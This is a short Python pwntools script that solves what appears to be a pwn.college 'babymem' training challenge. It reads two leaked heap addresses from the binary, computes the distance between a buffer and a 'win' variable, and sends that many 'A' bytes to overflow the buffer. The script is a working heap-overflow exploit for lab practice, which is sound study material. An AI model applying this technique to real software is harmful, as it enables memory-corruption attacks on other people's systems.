#!/usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary and run it
elf = ELF('/challenge/babymem_level2.0')
io = elf.process()

# Retrieve the buffer heap location
io.recvuntil(b'malloc(78) = 0x')
buffer_heap_address = int(io.recvline().decode()[:-1], 16)

# Retrieve the win heap location
io.recvuntil(b'sizeof(int)) = 0x')
win_heap_address = int(io.recvline().decode()[:-1], 16)

# Compute the payload size as: distance_between_buffer_and_win + win_dimension
payload_size = (win_heap_address - buffer_heap_address) + 4

# Send the payload size to the program
io.recvuntil(b'Payload size: ')
io.sendline(f"{payload_size}".encode())

# Build and send the payload to the program
PAYLOAD = b'A'*payload_size
io.recvuntil(b'bytes)!')
io.sendline(PAYLOAD)

# Print the output of the program
print(io.recvall().decode())